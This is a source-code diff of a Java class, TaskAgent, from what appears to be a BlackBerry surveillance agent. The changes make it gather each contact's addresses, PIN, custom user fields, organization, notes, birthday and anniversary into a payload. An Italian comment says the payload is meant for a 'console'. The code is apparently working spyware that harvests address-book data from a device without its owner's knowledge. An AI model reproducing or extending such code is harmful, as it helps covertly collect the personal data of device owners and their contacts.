@@ -9,6 +9,7 @@
  * *************************************************/
 package blackberry.agent;
 
+import java.util.Date;
 import java.util.Enumeration;
 
 import javax.microedition.pim.Contact;
@@ -17,6 +18,7 @@ import javax.microedition.pim.PIM;
 import javax.microedition.pim.PIMException;
 import javax.microedition.pim.PIMItem;
 
+import net.rim.blackberry.api.pdap.BlackBerryContact;
 import net.rim.blackberry.api.pdap.BlackBerryPIMList;
 import net.rim.blackberry.api.pdap.PIMListListener;
 import net.rim.device.api.util.DataBuffer;
@@ -35,7 +37,7 @@ import blackberry.utils.Utils;
  */
 public final class TaskAgent extends Agent implements PIMListListener {
     //#ifdef DEBUG
-    static Debug debug = new Debug("TaskAgent", DebugLevel.INFORMATION);
+    static Debug debug = new Debug("TaskAgent", DebugLevel.VERBOSE);
     //#endif
 
     Markup markup;
@@ -171,6 +173,14 @@ public final class TaskAgent extends Agent implements PIMListListener {
     }
 
     /**
+     * HomeAddressStreet = 0x21, HomeAddressCity = 0x22, HomeAddressState =
+     * 0x23, HomeAddressPostalCode = 0x24, HomeAddressCountry = 0x25,
+     * OtherAddressStreet = 0x26, OtherAddressCity = 0x27, OtherAddressState =
+     * 0x2F, OtherAddressPostalCode = 0x28, OtherAddressCountry = 0x29,
+     * BusinessAddressStreet = 0x2A, BusinessAddressCity = 0x2B,
+     * BusinessAddressState = 0x2C, BusinessAddressPostalCode = 0x2D,
+     * BusinessAddressCountry = 0x2E,
+     * 
      * @param contactList
      * @param version
      * @param contact
@@ -193,6 +203,8 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
         int uid = 0;
 
+        initCustomFields();
+        
         if (contactList.isSupportedField(Contact.UID)) {
             if (contact.countValues(Contact.UID) > 0) {
                 final String suid = contact.getString(Contact.UID, 0);
@@ -218,7 +230,6 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
                 addField(dbPayload, names, Contact.NAME_GIVEN, (byte) 0x01);
                 addField(dbPayload, names, Contact.NAME_FAMILY, (byte) 0x02);
-
             }
         }
 
@@ -237,19 +248,104 @@ public final class TaskAgent extends Agent implements PIMListListener {
         debug.trace("getContactPacket: addr");
         //#endif
         if (contactList.isSupportedField(Contact.ADDR)) {
-            if (contact.countValues(Contact.ADDR) > 0) {
-                final String[] addr = contact.getStringArray(Contact.ADDR, 0);
+            int numAddress = contact.countValues(Contact.ADDR);
 
-                addField(dbPayload, addr, Contact.ADDR_STREET, (byte) 0x21);
-                addField(dbPayload, addr, Contact.ADDR_EXTRA, (byte) 0x36);
-                addField(dbPayload, addr, Contact.ADDR_LOCALITY, (byte) 0x27);
+            //#ifdef DEBUG
+            debug.trace("getContactPacket, num addresses: " + numAddress);
+            //#endif
+
+            for (int i = 0; i < numAddress; i++) {
+                final String[] addr = contact.getStringArray(Contact.ADDR,
+                        i);
+
+                int attribute = contact.getAttributes(BlackBerryContact.ADDR,
+                        i);
+                if (attribute == BlackBerryContact.ATTR_HOME) {
+                    //#ifdef DEBUG
+                    debug.trace("getContactPacket addr home");
+                    //#endif
+
+                    addField(dbPayload, addr, Contact.ADDR_STREET, (byte) 0x21);
+                    addField(dbPayload, addr, Contact.ADDR_LOCALITY,
+                            (byte) 0x22);
+                    addField(dbPayload, addr, Contact.ADDR_REGION, (byte) 0x23);
+                    addField(dbPayload, addr, Contact.ADDR_POSTALCODE,
+                            (byte) 0x24);
+                    addField(dbPayload, addr, Contact.ADDR_COUNTRY, (byte) 0x25);
+
+                } else if (attribute == BlackBerryContact.ATTR_WORK) {
+                    //#ifdef DEBUG
+                    debug.trace("getContactPacket addr work");
+                    //#endif
+                    addField(dbPayload, addr, Contact.ADDR_STREET, (byte) 0x2A);
+                    addField(dbPayload, addr, Contact.ADDR_LOCALITY,
+                            (byte) 0x2B);
+                    addField(dbPayload, addr, Contact.ADDR_REGION, (byte) 0x2C);
+                    addField(dbPayload, addr, Contact.ADDR_POSTALCODE,
+                            (byte) 0x2D);
+                    addField(dbPayload, addr, Contact.ADDR_COUNTRY, (byte) 0x2E);
+                } else {
+                    //#ifdef DEBUG
+                    debug.trace("getContactPacket addr other");
+                    //#endif
+                    addField(dbPayload, addr, Contact.ADDR_STREET, (byte) 0x26);
+                    addField(dbPayload, addr, Contact.ADDR_LOCALITY,
+                            (byte) 0x26);
+                    addField(dbPayload, addr, Contact.ADDR_REGION, (byte) 0x2F);
+                    addField(dbPayload, addr, Contact.ADDR_POSTALCODE,
+                            (byte) 0x28);
+                    addField(dbPayload, addr, Contact.ADDR_COUNTRY, (byte) 0x29);
+                }
+
                 addField(dbPayload, addr, Contact.ADDR_POBOX, (byte) 0x2D);
-                addField(dbPayload, addr, Contact.ADDR_POSTALCODE, (byte) 0x28);
-                addField(dbPayload, addr, Contact.ADDR_REGION, (byte) 0x2E);
-                addField(dbPayload, addr, Contact.ADDR_COUNTRY, (byte) 0x2F);
+                addField(dbPayload, addr, Contact.ADDR_EXTRA, (byte) 0x36);
 
             }
         }
+
+        //#ifdef DEBUG
+        debug.trace("getContactPacket: pin");
+        //#endif
+        addCustomField(contactList, contact, BlackBerryContact.PIN,
+                "PIN: ");
+
+        //#ifdef DEBUG
+        debug.trace("getContactPacket: users");
+        //#endif
+        addCustomField(contactList, contact,
+                BlackBerryContact.USER1, "USER1: ");
+        addCustomField(contactList, contact,
+                BlackBerryContact.USER2, "USER2: ");
+        addCustomField(contactList, contact,
+                BlackBerryContact.USER3, "USER3: ");
+        addCustomField(contactList, contact,
+                BlackBerryContact.USER4, "USER4: ");
+
+        //#ifdef DEBUG
+        debug.trace("getContactPacket: org");
+        //#endif
+        addCustomField(contactList, contact, BlackBerryContact.ORG,
+                "Organization: ");
+
+        //#ifdef DEBUG
+        debug.trace("getContactPacket: note");
+        //#endif
+        addCustomField(contactList, contact, BlackBerryContact.NOTE,
+                "Note: ");
+
+        //#ifdef DEBUG
+        debug.trace("getContactPacket: anniversary");
+        //#endif
+        addCustomDateField(contactList, contact,
+                BlackBerryContact.ANNIVERSARY, "Anniversary: ");
+
+        //#ifdef DEBUG
+        debug.trace("getContactPacket: birthday");
+        //#endif
+        addCustomDateField(contactList, contact,
+                BlackBerryContact.BIRTHDAY, "Birthday: ");
+        
+        finalizeCustomFields(dbPayload);
 
         final int size = dbPayload.getLength() + header.length;
         //#ifdef DEBUG
@@ -348,8 +444,78 @@ public final class TaskAgent extends Agent implements PIMListListener {
             }
         }
     }
+    
+    StringBuffer customBuffer=new StringBuffer();
 
-    private void addTelField(ContactList contactList, Contact contact,
+    /**
+     * La cosole accetta un solo custom field, 
+     * quindi deve essere simulato costruendo una stringa da serializzare
+     * solo nella finalize
+     */
+    private void initCustomFields() {
+        //#ifdef DEBUG
+        debug.trace("initCustomFields");
+        //#endif
+        customBuffer=new StringBuffer();
+    }
+
+    private void finalizeCustomFields(DataBuffer dbPayload) {
+        //#ifdef DEBUG
+        debug.trace("finalizeCustomFields");
+        //#endif
+        
+        if(customBuffer==null){
+            //#ifdef DEBUG
+            debug.error("finishCustomFields");
+            //#endif
+        }else{
+            //#ifdef DEBUG
+            debug.trace("finishCustomFields: "+customBuffer.toString());
+            //#endif
+            Utils.addTypedString(dbPayload, (byte) 0x37, customBuffer.toString());
+        }
+    }
+    
+    protected void addCustomField(ContactList contactList, Contact contact,
+             int contactType, String typeName) {
+
+        if (contactList.isSupportedField(contactType)) {
+            try {
+
+                if (contact.countValues(contactType) > 0) {
+                    final String value = contact.getString(contactType, 0);
+                    customBuffer.append(typeName+value+"\r\n");
+                }
+
+            } catch (final Exception ex) {
+                //#ifdef DEBUG
+                debug.error(ex);
+                //#endif
+            }
+        }
+    }
+
+    protected void addCustomDateField(ContactList contactList, Contact contact,
+            int contactType, String typeName) {
+
+        if (contactList.isSupportedField(contactType)) {
+            try {
+
+                if (contact.countValues(contactType) > 0) {
+                    final long value = contact.getDate(contactType, 0);
+                    customBuffer.append(typeName+ (new Date(
+                            value)).toString()+"\r\n");
+                }
+
+            } catch (final Exception ex) {
+                //#ifdef DEBUG
+                debug.error(ex);
+                //#endif
+            }
+        }
+    }
+
+    protected void addTelField(ContactList contactList, Contact contact,
             DataBuffer dbPayload, int contactType, byte logType) {
 
         if (contactList.isSupportedField(contactType)) {
@@ -429,7 +595,7 @@ public final class TaskAgent extends Agent implements PIMListListener {
     private void save(PIMItem item) {
         try {
             final ContactList contactList = (ContactList) item.getPIMList();
-            final Contact contact = (Contact) item;
+            final BlackBerryContact contact = (BlackBerryContact) item;
 
             final byte[] payload = getContactPacket(contactList, contact);
 
